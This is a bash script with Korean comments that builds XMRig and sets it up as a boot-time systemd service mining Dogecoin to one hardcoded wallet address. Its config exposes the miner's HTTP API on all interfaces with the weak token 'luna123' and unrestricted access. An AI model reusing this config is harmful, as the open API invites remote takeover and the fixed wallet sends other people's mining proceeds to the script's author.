#!/bin/bash

# --- Luna Mining OS (L-MOS) 자동 설치 & 최적화 스크립트 ---
# 버전: 1.0 (DOGE 전용)
# ---------------------------------------------------

# 1. 시스템 업데이트 및 필수 패키지 설치
echo "🚀 [L-MOS] 시스템 업데이트 및 필수 라이브러리 설치 중..."
sudo apt-get update
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# 2. XMRig 소스 가져오기 및 빌드
echo "⛏️ [L-MOS] XMRig 최신 버전 다운로드 및 컴파일 시작..."
cd ~
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
cd xmrig/build
cmake ..
make -j$(nproc)

# 3. 설정 파일 생성 (도지코인 전용 + API 활성화)
echo "⚙️ [L-MOS] 채굴 설정 파일 구성 중 (DHNhBWgAfWUHzzFJLBTKoaFtaarNkfV7xf)..."
cat <<EOF > config.json
{
    "api": {
        "id": null,
        "worker-id": "Luna-OS-Node"
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 16288,
        "access-token": "luna123",
        "restricted": false
    },
    "autosave": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "priority": 1
    },
    "pools": [
        {
            "algo": "rx/0",
            "url": "rx.unmineable.com:3333",
            "user": "DOGE:DHNhBWgAfWUHzzFJLBTKoaFtaarNkfV7xf.LunaOS",
            "pass": "x"
        }
    ]
}
EOF

# 4. 부팅 시 자동 시작 서비스 등록
echo "🔄 [L-MOS] 자동 시작 서비스(systemd) 등록 중..."
sudo bash -c "cat <<EOF > /etc/systemd/system/luna-miner.service
[Unit]
Description=Luna Mining OS Auto Miner
After=network.target

[Service]
ExecStart=$(pwd)/xmrig --config=$(pwd)/config.json
Restart=always
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF"

sudo systemctl daemon-reload
sudo systemctl enable luna-miner

# 5. Huge Pages 최적화 (채굴 효율 상승)
echo "⚡ [L-MOS] 채굴 효율 최적화 적용 중..."
sudo bash -c "echo 'vm.nr_hugepages=1280' >> /etc/sysctl.conf"
sudo sysctl -p

echo "✅ [L-MOS] 설치 및 최적화 완료!"
echo "이제 재부팅하면 자동으로 도지코인 채굴이 시작됩니다."
echo "확인 명령어: sudo systemctl status luna-miner"
